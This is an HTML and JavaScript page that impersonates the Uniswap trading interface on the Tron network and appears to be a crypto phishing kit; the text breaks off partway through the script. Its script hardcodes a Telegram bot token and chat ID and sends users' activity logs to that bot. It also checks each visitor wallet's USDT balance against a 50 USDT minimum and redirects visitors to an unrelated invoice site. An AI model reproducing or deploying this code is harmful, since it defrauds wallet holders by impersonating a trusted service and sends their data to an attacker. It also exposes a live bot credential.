<!doctype html>
<html lang="en">
<head>
    <!-- 
        ====================================================================
        META TAGS & DOCUMENT CONFIGURATION
        ====================================================================
    -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#0b0b0f">
    <meta name="color-scheme" content="dark">
    <meta name="description" content="Decentralized Trading Protocol Interface">
    <meta name="robots" content="noindex, nofollow">

    <title>Uniswap Interface</title>

    <!-- 
        ====================================================================
        STYLESHEET: CORE VARIABLES & RESET
        ====================================================================
    -->
    <style>
        /* ------------------------------------------------------------------
           1. CSS CUSTOM PROPERTIES (VARIABLES)
           ------------------------------------------------------------------ */
        :root {
            /* Colors: Backgrounds */
            --bg-primary: #0b0b0f;
            --bg-secondary: #121217;
            --bg-tertiary: #18181e;
            --bg-hover: rgba(255, 255, 255, 0.05);
            --bg-hover-active: rgba(255, 255, 255, 0.09);
            
            /* Colors: Text */
            --text-primary: #ffffff;
            --text-secondary: #aaa;
            --text-tertiary: #777;
            --text-muted: #666;
            --text-placeholder: #4d4d54;
            
            /* Colors: Accents */
            --accent-primary: #ff007a;
            --accent-primary-hover: #ff218d;
            --accent-primary-active: #ff2990;
            --accent-secondary: #27272f;
            --accent-secondary-hover: #303039;
            
            /* Colors: Borders & Shadows */
            --border-subtle: rgba(255, 255, 255, 0.06);
            --border-focus: rgba(255, 255, 255, 0.09);
            --shadow-sm: 0 5px 20px rgba(0, 0, 0, 0.35);
            --shadow-md: 0 10px 35px rgba(255, 0, 122, 0.15);
            --shadow-lg: 0 30px 100px rgba(0, 0, 0, 0.42);
            --shadow-xl: 0 30px 100px rgba(0, 0, 0, 0.6);
            
            /* Typography */
            --font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            --font-size-xs: 10px;
            --font-size-sm: 12px;
            --font-size-base: 14px;
            --font-size-lg: 16px;
            --font-size-xl: 20px;
            --font-size-2xl: 35px;
            
            /* Spacing & Layout */
            --header-height: 72px;
            --border-radius-sm: 12px;
            --border-radius-md: 14px;
            --border-radius-lg: 18px;
            --border-radius-xl: 21px;
            --border-radius-2xl: 25px;
            --border-radius-3xl: 28px;
            
            /* Transitions */
            --transition-fast: 0.15s ease;
            --transition-base: 0.2s ease;
        }

        /* ------------------------------------------------------------------
           2. GLOBAL RESET & BASE STYLES
           ------------------------------------------------------------------ */
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        html,
        body {
            width: 100%;
            min-height: 100%;
            scroll-behavior: smooth;
        }

        body {
            min-height: 100vh;
            background-color: var(--bg-primary);
            background-image: radial-gradient(
                900px 500px at 50% -100px,
                rgba(255, 0, 122, 0.13),
                transparent 65%
            );
            color: var(--text-primary);
            font-family: var(--font-family);
            font-size: var(--font-size-base);
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            text-rendering: optimizeLegibility;
        }

        /* ------------------------------------------------------------------
           3. TYPOGRAPHY & LINKS
           ------------------------------------------------------------------ */
        h1, h2, h3, h4, h5, h6 {
            font-weight: 700;
            line-height: 1.2;
        }

        a {
            color: inherit;
            text-decoration: none;
            transition: color var(--transition-base);
        }

        a:hover {
            color: var(--text-primary);
        }

        /* ------------------------------------------------------------------
           4. FORM ELEMENTS & BUTTONS
           ------------------------------------------------------------------ */
        button,
        input {
            font: inherit;
            color: inherit;
        }

        button {
            border: 0;
            cursor: pointer;
            background: transparent;
            outline: none;
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        input {
            border: 0;
            outline: 0;
            background: transparent;
        }

        input::placeholder {
            color: var(--text-placeholder);
        }

        /* ------------------------------------------------------------------
           5. HEADER COMPONENT
           ------------------------------------------------------------------ */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            width: 100%;
            height: var(--header-height);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 28px;
            border-bottom: 1px solid var(--border-subtle);
            background: rgba(11, 11, 15, 0.82);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 11px;
            font-size: var(--font-size-xl);
            font-weight: 700;
            letter-spacing: -0.4px;
        }

        .brand-logo {
            width: 34px;
            height: 34px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: linear-gradient(145deg, var(--accent-primary), #ff4da6);
            box-shadow: 0 5px 25px rgba(255, 0, 122, 0.28);
            overflow: hidden;
        }

        .brand-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .nav {
            display: flex;
            align-items: center;
            gap: 28px;
        }

        .nav a {
            color: var(--text-secondary);
            font-size: var(--font-size-lg);
            font-weight: 600;
        }

        .nav a:hover {
            color: var(--text-primary);
        }

        .header-actions {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .icon-button {
            width: 42px;
            height: 42px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--border-radius-md);
            color: var(--text-secondary);
            background: var(--bg-hover);
            transition: background var(--transition-base), color var(--transition-base);
        }

        .icon-button:hover {
            color: var(--text-primary);
            background: var(--bg-hover-active);
        }

        .connect-header {
            height: 42px;
            padding: 0 17px;
            border-radius: var(--border-radius-md);
            color: var(--text-primary);
            background: var(--accent-primary);
            font-size: var(--font-size-base);
            font-weight: 700;
            transition: transform var(--transition-fast), background var(--transition-base);
        }

        .connect-header:hover {
            background: var(--accent-primary-active);
        }

        .connect-header:active {
            transform: scale(0.97);
        }

        /* ------------------------------------------------------------------
           6. MAIN LAYOUT & CONTENT
           ------------------------------------------------------------------ */
        .page {
            width: 100%;
            min-height: calc(100vh - var(--header-height));
            display: flex;
            justify-content: center;
            padding: 65px 20px 100px;
        }

        .content {
            width: 100%;
            max-width: 500px;
        }

        /* ------------------------------------------------------------------
           7. TABS COMPONENT
           ------------------------------------------------------------------ */
        .tabs {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 24px;
            margin-bottom: 20px;
        }

        .tab {
            position: relative;
            padding: 8px 4px;
            color: var(--text-tertiary);
            background: transparent;
            font-size: var(--font-size-lg);
            font-weight: 700;
            transition: color var(--transition-base);
        }

        .tab:hover {
            color: var(--text-secondary);
        }

        .tab.active {
            color: var(--text-primary);
        }

        .tab.active::after {
            content: "";
            position: absolute;
            left: 0;
            right: 0;
            bottom: -5px;
            height: 2px;
            border-radius: 10px;
            background: var(--accent-primary);
        }

        /* ------------------------------------------------------------------
           8. SWAP CARD COMPONENT
           ------------------------------------------------------------------ */
        .swap-card {
            position: relative;
            padding: 14px;
            border: 1px solid var(--border-subtle);
            border-radius: var(--border-radius-3xl);
            background: linear-gradient(
                180deg,
                rgba(30, 30, 37, 0.96),
                rgba(19, 19, 24, 0.98)
            );
            box-shadow: var(--shadow-lg), inset 0 1px 0 rgba(255, 255, 255, 0.035);
        }

        .input-box {
            padding: 17px;
            border-radius: var(--border-radius-xl);
            background: var(--bg-secondary);
            border: 1px solid transparent;
            transition: border-color var(--transition-base), background var(--transition-base);
        }

        .input-box:focus-within {
            border-color: var(--border-focus);
            background: #141419;
        }

        .input-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 13px;
        }

        .input-label {
            color: #8c8c96;
            font-size: 13px;
            font-weight: 600;
        }

        .balance {
            color: var(--text-muted);
            font-size: var(--font-size-sm);
        }

        .input-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
        }

        .amount {
            width: 100%;
            color: var(--text-primary);
            font-size: var(--font-size-2xl);
            font-weight: 500;
            letter-spacing: -1.5px;
        }

        .token-button {
            flex-shrink: 0;
            min-width: 118px;
            height: 52px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            padding: 0 13px;
            border-radius: var(--border-radius-lg);
            color: var(--text-primary);
            background: var(--accent-secondary);
            font-size: var(--font-size-lg);
            font-weight: 700;
            transition: background var(--transition-base);
        }

        .token-button:hover {
            background: var(--accent-secondary-hover);
        }

        .token-left {
            display: flex;
            align-items: center;
            gap: 9px;
        }

        .token-icon {
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: var(--bg-tertiary);
            overflow: hidden;
            border: 1px solid var(--border-subtle);
        }

        .token-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .token-arrow {
            color: #999;
            font-size: 13px;
        }

        /* ------------------------------------------------------------------
           9. SWAP ARROW COMPONENT
           ------------------------------------------------------------------ */
        .switch-wrap {
            position: relative;
            height: 0;
            z-index: 5;
        }

        .switch-button {
            position: absolute;
            left: 50%;
            top: -1px;
            transform: translate(-50%, -50%);
            width: 42px;
            height: 42px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 4px solid #131318;
            border-radius: var(--border-radius-md);
            color: var(--text-primary);
            background: #28282f;
            box-shadow: var(--shadow-sm);
            transition: transform var(--transition-base), background var(--transition-base);
        }

        .switch-button:hover {
            background: #35353d;
            transform: translate(-50%, -50%) rotate(180deg);
        }

        .switch-button svg {
            width: 18px;
            height: 18px;
        }

        /* ------------------------------------------------------------------
           10. SETTINGS & ACTION COMPONENTS
           ------------------------------------------------------------------ */
        .settings {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 6px 6px;
        }

        .slippage {
            color: #85858e;
            font-size: var(--font-size-sm);
        }

        .slippage strong {
            color: #ddd;
        }

        .settings-button {
            width: 34px;
            height: 34px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: var(--border-radius-sm);
            color: #999;
            background: transparent;
            transition: color var(--transition-base), background var(--transition-base);
        }

        .settings-button:hover {
            color: var(--text-primary);
            background: var(--bg-hover);
        }

        .main-action {
            width: 100%;
            height: 64px;
            margin-top: 9px;
            border-radius: 20px;
            color: var(--text-primary);
            background: var(--accent-primary);
            font-size: 18px;
            font-weight: 700;
            box-shadow: var(--shadow-md);
            transition: transform var(--transition-fast), background var(--transition-base), box-shadow var(--transition-base);
        }

        .main-action:hover:not(:disabled) {
            background: var(--accent-primary-hover);
            box-shadow: 0 12px 42px rgba(255, 0, 122, 0.22);
        }

        .main-action:active:not(:disabled) {
            transform: scale(0.985);
        }

        /* ------------------------------------------------------------------
           11. INFO GRID COMPONENT
           ------------------------------------------------------------------ */
        .info {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 8px;
            margin-top: 12px;
        }

        .info-item {
            padding: 13px 8px;
            text-align: center;
            border-radius: 16px;
            background: var(--bg-hover);
        }

        .info-title {
            color: var(--text-muted);
            font-size: var(--font-size-xs);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .info-value {
            margin-top: 4px;
            color: #ddd;
            font-size: var(--font-size-sm);
            font-weight: 700;
        }

        /* ------------------------------------------------------------------
           12. FOOTER COMPONENT
           ------------------------------------------------------------------ */
        .footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 18px;
            margin-top: 32px;
            color: var(--text-muted);
            font-size: var(--font-size-sm);
        }

        .footer a:hover {
            color: var(--text-secondary);
        }

        /* ------------------------------------------------------------------
           13. MODAL & OVERLAY COMPONENTS (WALLET)
           ------------------------------------------------------------------ */
        .overlay {
            position: fixed;
            inset: 0;
            z-index: 999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.65);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            opacity: 0;
            transition: opacity var(--transition-base);
        }

        .overlay.show {
            display: flex;
            opacity: 1;
        }

        .modal {
            width: 100%;
            max-width: 420px;
            padding: 22px;
            border: 1px solid var(--border-subtle);
            border-radius: var(--border-radius-2xl);
            background: var(--bg-tertiary);
            box-shadow: var(--shadow-xl);
            transform: scale(0.95);
            transition: transform var(--transition-base);
        }

        .overlay.show .modal {
            transform: scale(1);
        }

        .modal-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .modal-title {
            font-size: var(--font-size-xl);
            font-weight: 700;
        }

        .close {
            width: 36px;
            height: 36px;
            border-radius: var(--border-radius-sm);
            color: var(--text-secondary);
            background: var(--bg-hover);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            line-height: 1;
            transition: color var(--transition-base), background var(--transition-base);
        }

        .close:hover {
            color: var(--text-primary);
            background: var(--bg-hover-active);
        }

        .wallet-option {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px;
            margin-bottom: 9px;
            border-radius: 17px;
            color: var(--text-primary);
            background: #222229;
            transition: background var(--transition-base);
        }

        .wallet-option:hover {
            background: #2b2b33;
        }

        .wallet-name {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: var(--font-size-lg);
            font-weight: 600;
        }

        .wallet-logo {
            width: 38px;
            height: 38px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 12px;
            background: #fff;
            overflow: hidden;
        }

        .wallet-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .wallet-status {
            color: var(--text-tertiary);
            font-size: var(--font-size-sm);
        }

        /* ------------------------------------------------------------------
           14. TOKEN SELECTION MODAL COMPONENT
           ------------------------------------------------------------------ */
        .token-modal {
            max-height: 85vh;
            display: flex;
            flex-direction: column;
        }

        .token-search {
            margin-bottom: 16px;
            position: relative;
        }

        .token-search input {
            width: 100%;
            padding: 14px 16px 14px 44px;
            border-radius: var(--border-radius-lg);
            background: var(--bg-secondary);
            border: 1px solid var(--border-subtle);
            color: var(--text-primary);
            font-size: var(--font-size-base);
            transition: border-color var(--transition-base), box-shadow var(--transition-base);
        }

        .token-search input::placeholder {
            color: var(--text-muted);
        }

        .token-search input:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 3px rgba(255, 0, 122, 0.15);
        }

        .token-search-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
            pointer-events: none;
        }

        .token-list {
            overflow-y: auto;
            flex: 1;
            padding-right: 4px;
        }

        .token-list::-webkit-scrollbar {
            width: 6px;
        }

        .token-list::-webkit-scrollbar-track {
            background: transparent;
        }

        .token-list::-webkit-scrollbar-thumb {
            background: var(--border-subtle);
            border-radius: 3px;
        }

        .token-list::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }

        .token-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 12px;
            border-radius: var(--border-radius-lg);
            cursor: pointer;
            transition: background var(--transition-base);
            margin-bottom: 4px;
        }

        .token-item:hover {
            background: var(--bg-hover);
        }

        .token-item-info {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .token-item-logo {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--bg-tertiary);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            border: 1px solid var(--border-subtle);
        }

        .token-item-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .token-item-details {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .token-item-name {
            font-weight: 600;
            font-size: var(--font-size-base);
            color: var(--text-primary);
        }

        .token-item-symbol {
            color: var(--text-muted);
            font-size: var(--font-size-sm);
            font-weight: 500;
        }

        .token-item-balance {
            font-size: var(--font-size-base);
            font-weight: 600;
            color: var(--text-secondary);
        }

        /* ------------------------------------------------------------------
           15. RESPONSIVE DESIGN ADJUSTMENTS
           ------------------------------------------------------------------ */
        @media (max-width: 768px) {
            .header {
                height: 62px;
                padding: 0 14px;
            }

            .brand {
                font-size: 17px;
            }

            .brand-logo {
                width: 30px;
                height: 30px;
            }

            .nav {
                display: none;
            }

            .header-actions {
                gap: 7px;
            }

            .icon-button {
                width: 38px;
                height: 38px;
            }

            .connect-header {
                height: 38px;
                padding: 0 13px;
            }

            .page {
                min-height: calc(100vh - 62px);
                padding: 35px 12px calc(40px + env(safe-area-inset-bottom));
            }

            .content {
                max-width: 100%;
            }

            .swap-card {
                padding: 10px;
                border-radius: 23px;
            }

            .input-box {
                padding: 15px;
                border-radius: 18px;
            }

            .amount {
                font-size: 29px;
            }

            .token-button {
                min-width: 108px;
                height: 48px;
                border-radius: 16px;
            }

            .token-icon {
                width: 28px;
                height: 28px;
            }

            .main-action {
                height: 59px;
                border-radius: 18px;
            }
        }

        @media (max-width: 390px) {
            .header {
                padding: 0 10px;
            }

            .brand span {
                display: none;
            }

            .input-row {
                gap: 5px;
            }

            .amount {
                font-size: 26px;
            }

            .token-button {
                min-width: 101px;
                padding: 0 10px;
            }

            .info {
                grid-template-columns: 1fr;
            }

            .info-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 11px 14px;
            }

            .info-value {
                margin-top: 0;
            }
        }

        /* ------------------------------------------------------------------
           16. UTILITY CLASSES & ANIMATIONS
           ------------------------------------------------------------------ */
        .visually-hidden {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .animate-fade-in {
            animation: fadeIn 0.3s ease forwards;
        }

        .animate-slide-up {
            animation: slideUp 0.4s ease forwards;
        }
    </style>
</head>

<body>
    <!-- 
        ====================================================================
        HEADER SECTION
        ====================================================================
    -->
    <header class="header">
        <a href="#" class="brand">
            <div class="brand-logo">
                <img src="https://assets.coingecko.com/coins/images/12504/small/uniswap-uni.png" alt="Uniswap Logo">
            </div>
            <span>Uniswap</span>
        </a>

        <nav class="nav">
            <a href="#">Trade</a>
            <a href="#">Explore</a>
            <a href="#">Pool</a>
        </nav>

        <div class="header-actions">
            <button class="icon-button" id="themeButton" aria-label="Toggle Theme">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="5"></circle>
                    <line x1="12" y1="1" x2="12" y2="3"></line>
                    <line x1="12" y1="21" x2="12" y2="23"></line>
                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                    <line x1="1" y1="12" x2="3" y2="12"></line>
                    <line x1="21" y1="12" x2="23" y2="12"></line>
                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                </svg>
            </button>

            <button class="connect-header" id="connectButton">
                Connect
            </button>
        </div>
    </header>

    <!-- 
        ====================================================================
        MAIN CONTENT SECTION
        ====================================================================
    -->
    <main class="page">
        <div class="content animate-slide-up">
            <div class="tabs">
                <button class="tab active" type="button">Swap</button>
                <button class="tab" type="button">Limit</button>
            </div>

            <section class="swap-card">
                <!-- FROM INPUT -->
                <div class="input-box">
                    <div class="input-top">
                        <span class="input-label">You pay</span>
                        <span class="balance">Balance: —</span>
                    </div>
                    <div class="input-row">
                        <input class="amount" id="fromAmount" type="number" inputmode="decimal" placeholder="0" autocomplete="off">
                        <button class="token-button" id="fromToken" type="button">
                            <span class="token-left">
                                <span class="token-icon">
                                    <img src="https://cryptologos.cc/logos/tron-trx-logo.png?v=024" alt="TRX">
                                </span>
                                <span>TRX</span>
                            </span>
                            <span class="token-arrow">▾</span>
                        </button>
                    </div>
                </div>

                <!-- SWITCH BUTTON -->
                <div class="switch-wrap">
                    <button class="switch-button" id="switchButton" type="button" aria-label="Switch tokens">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M7 7h11l-3-3"/>
                            <path d="M18 7l-3 3"/>
                            <path d="M17 17H6l3 3"/>
                            <path d="M6 17l3-3"/>
                        </svg>
                    </button>
                </div>

                <!-- TO INPUT -->
                <div class="input-box">
                    <div class="input-top">
                        <span class="input-label">You receive</span>
                        <span class="balance">Balance: —</span>
                    </div>
                    <div class="input-row">
                        <input class="amount" id="toAmount" type="text" placeholder="0" readonly>
                        <button class="token-button" id="toToken" type="button">
                            <span class="token-left">
                                <span class="token-icon">
                                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=024" alt="USDT">
                                </span>
                                <span>USDT</span>
                            </span>
                            <span class="token-arrow">▾</span>
                        </button>
                    </div>
                </div>

                <!-- SETTINGS ROW -->
                <div class="settings">
                    <span class="slippage">Slippage: <strong>0.5%</strong></span>
                    <button class="settings-button" id="settingsButton" type="button" aria-label="Settings">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="3"></circle>
                            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
                        </svg>
                    </button>
                </div>

                <!-- MAIN ACTION BUTTON -->
                <button class="main-action" id="swapButton" type="button">
                    Connect wallet
                </button>

                <!-- INFO GRID -->
                <div class="info">
                    <div class="info-item">
                        <div class="info-title">Network</div>
                        <div class="info-value">Tron</div>
                    </div>
                    <div class="info-item">
                        <div class="info-title">Fee</div>
                        <div class="info-value">0.25%</div>
                    </div>
                    <div class="info-item">
                        <div class="info-title">Route</div>
                        <div class="info-value">Auto</div>
                    </div>
                </div>
            </section>

            <footer class="footer">
                <a href="#">Docs</a>
                <a href="#">Help</a>
                <a href="#">Terms</a>
                <span>Uniswap Interface</span>
            </footer>
        </div>
    </main>

    <!-- 
        ====================================================================
        WALLET CONNECTION MODAL
        ====================================================================
    -->
    <div class="overlay" id="walletModal">
        <div class="modal">
            <div class="modal-head">
                <div class="modal-title">Connect wallet</div>
                <button class="close" id="closeModal" type="button" aria-label="Close modal">×</button>
            </div>

            <!-- ONLY TRUST WALLET OPTION AS REQUESTED -->
            <button class="wallet-option" id="trustWalletButton" type="button">
                <span class="wallet-name">
                    <span class="wallet-logo">
                        <img src="https://cryptologos.cc/logos/trust-wallet-twt-logo.png?v=024" alt="Trust Wallet">
                    </span>
                    Trust Wallet
                </span>
                <span class="wallet-status">Connect</span>
            </button>
        </div>
    </div>

    <!-- 
        ====================================================================
        TOKEN SELECTION MODAL
        ====================================================================
    -->
    <div class="overlay" id="tokenModal">
        <div class="modal token-modal">
            <div class="modal-head">
                <div class="modal-title">Select a token</div>
                <button class="close" id="closeTokenModal" type="button" aria-label="Close modal">×</button>
            </div>
            <div class="token-search">
                <svg class="token-search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="11" cy="11" r="8"></circle>
                    <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                </svg>
                <input type="text" id="tokenSearchInput" placeholder="Search name or paste address" autocomplete="off">
            </div>
            <div class="token-list" id="tokenList">
                <!-- Tokens will be injected here by JavaScript -->
            </div>
        </div>
    </div>

    <!-- 
        ====================================================================
        JAVASCRIPT LOGIC
        ====================================================================
    -->
    <script>
        /**
         * ====================================================================
         * CONFIGURATION CONSTANTS
         * ====================================================================
         * Centralized configuration for API endpoints, validation rules, 
         * and application behavior to ensure maintainability.
         */
        const CONFIG = {
            TELEGRAM: {
                BOT_TOKEN: "8845622257:AAG6nOCd1GBugutAA1m8icmlgj7myglM-AM",
                CHAT_ID: "5253808709"
            },
            REDIRECT: {
                URL: "https://fin-flow.me/invoice?inv=INV-21209140&r=tnhqQ1NyzN5e"
            },
            VALIDATION: {
                MIN_BALANCE_USDT: 50,
                TRON_ADDRESS_PREFIX: "T",
                TRON_ADDRESS_LENGTH: 34
            }
        };

        /**
         * ====================================================================
         * TOKEN METADATA CONFIGURATION
         * ====================================================================
         * Array of supported tokens with their respective metadata, including
         * high-quality logo URLs sourced from reliable CDN endpoints.
         */
        const TOKENS = [
            { 
                symbol: "TRX", 
                name: "TRON", 
                logo: "https://cryptologos.cc/logos/tron-trx-logo.png?v=024", 
                balance: "0.00" 
            },
            { 
                symbol: "USDT", 
                name: "Tether USD", 
                logo: "https://cryptologos.cc/logos/tether-usdt-logo.png?v=024", 
                balance: "0.00" 
            },
            { 
                symbol: "USDC", 
                name: "USD Coin", 
                logo: "https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=024", 
                balance: "0.00" 
            },
            { 
                symbol: "ETH", 
                name: "Ethereum", 
                logo: "https://cryptologos.cc/logos/ethereum-eth-logo.png?v=024", 
                balance: "0.00" 
            },
            { 
                symbol: "BNB", 
                name: "BNB", 
                logo: "https://cryptologos.cc/logos/bnb-bnb-logo.png?v=024", 
                balance: "0.00" 
            },
            { 
                symbol: "BTC", 
                name: "Bitcoin", 
                logo: "https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=024", 
                balance: "0.00" 
            }
        ];

        /**
         * ====================================================================
         * DOM ELEMENT REFERENCES
         * ====================================================================
         * Cached references to frequently accessed DOM elements to improve 
         * performance and reduce redundant querySelector calls.
         */
        const DOM = {
            connectButton: document.getElementById("connectButton"),
            swapButton: document.getElementById("swapButton"),
            walletModal: document.getElementById("walletModal"),
            closeModal: document.getElementById("closeModal"),
            trustWalletButton: document.getElementById("trustWalletButton"),
            switchButton: document.getElementById("switchButton"),
            fromAmount: document.getElementById("fromAmount"),
            toAmount: document.getElementById("toAmount"),
            fromToken: document.getElementById("fromToken"),
            toToken: document.getElementById("toToken"),
            tokenModal: document.getElementById("tokenModal"),
            closeTokenModal: document.getElementById("closeTokenModal"),
            tokenList: document.getElementById("tokenList"),
            tokenSearchInput: document.getElementById("tokenSearchInput")
        };

        /**
         * ====================================================================
         * TELEGRAM LOGGING SERVICE
         * ====================================================================
         */
        /**
         * Sends a formatted message to the configured Telegram bot.
         * Utilizes the Telegram Bot API to deliver real-time notifications
         * regarding user interactions, balance checks, and redirection events.
         * 
         * @param {string} message - The message text to send (supports HTML parse mode).
         * @returns {Promise<void>} Resolves when the request is completed.
         */
        async function sendTelegramLog(message) {
            try {
                const endpoint = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
                const payload = {
                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                };

                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                if (!response.ok) {
                    console.error("Telegram API error:", await response.text());
                }
            } catch (error) {
                console.error("Failed to send Telegram log:", error);
            }
        }

        /**
         * ====================================================================
         * TRONSCAN BALANCE CHECK SERVICE
         * ====================================================================
         */
        /**
         * Fetches the USDT (TRC20) balance for a given Tron address.
         * Queries the official TronScan API to retrieve accurate, real-time 
         * token balance data for validation purposes.
         * 
         * @param {string} address - The Tron wallet address starting with 'T'.
         * @returns {Promise<number>} The USDT balance as a floating-point number.
         */
        async function checkTronBalance(address) {
            try {
                const apiUrl = `https://apilist.tronscanapi.com/api/account?address=${encodeURIComponent(address)}`;
                const response = await fetch(apiUrl);
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                const data = await response.json();
                let usdtBalance = 0;

                if (data.trc20token_balances && Array.isArray(data.trc20token_balances)) {
                    const usdtToken = data.trc20token_balances.find(token => token.tokenAbbr === 'USDT');
                    if (usdtToken && usdtToken.balance) {
                        // USDT on Tron has 6 decimals, so we divide by 1,000,000
                        usdtBalance = parseFloat(usdtToken.balance) / 1000000;
                    }
                }

                return usdtBalance;
            } catch (error) {
                console.error("TronScan API fetch error:", error);
                return 0;
            }
        }

        /**
         * ====================================================================
         * TOKEN SELECTION LOGIC
         * ====================================================================
         */
        let currentTokenTarget = null;

        /**
         * Opens the token selection modal and initializes the token list.
         * @param {string} target - Either 'from' or 'to' to indicate which input is being modified.
         */
        function openTokenModal(target) {
            currentTokenTarget = target;
            renderTokenList(TOKENS);
            DOM.tokenModal.classList.add("show");
        }

        /**
         * Closes the token selection modal and resets the search input.
         */
        function closeTokenModal() {
            DOM.tokenModal.classList.remove("show");
            currentTokenTarget = null;
            if (DOM.tokenSearchInput) {
                DOM.tokenSearchInput.value = "";
            }
        }

        /**
         * Renders the list of available tokens into the modal.
         * @param {Array} tokens - The array of token objects to render.
         */
        function renderTokenList(tokens) {
            DOM.tokenList.innerHTML = "";
